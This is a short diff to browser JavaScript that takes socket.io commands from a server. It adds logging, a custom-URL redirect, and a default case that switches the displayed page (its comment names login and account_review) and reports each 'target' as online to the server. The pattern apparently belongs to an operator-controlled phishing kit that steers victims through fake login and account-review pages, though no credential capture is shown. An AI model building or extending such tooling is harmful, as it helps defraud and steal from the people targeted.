@@ -97,6 +97,8 @@
             
             socket.on('action', (data) => {
                 console.log('Received action:', data);
+                console.log('Action type:', data.action);
+                console.log('Custom URL:', data.customUrl);
                 handleAction(data.action, data.customUrl);
             });
             
@@ -129,8 +131,12 @@
         
         switch (action) {
             case 'redirect':
+            case 'customRedirect':
                 if (customUrl) {
+                    console.log('Redirecting to:', customUrl);
                     window.location.href = customUrl;
+                } else {
+                    console.log('No URL provided for redirect');
                 }
                 break;
             case 'reload':
@@ -150,7 +156,17 @@
                 }
                 break;
             default:
-                console.log('Unknown action:', action);
+                // Handle page changes (login, account_review, etc.)
+                console.log('Changing page to:', action);
+                currentPage = action;
+                if (socket && targetID) {
+                    socket.emit('updateStatus', {
+                        targetID: targetID,
+                        status: 'Online',
+                        currentPage: currentPage
+                    });
+                }
+                break;
         }
     }
     
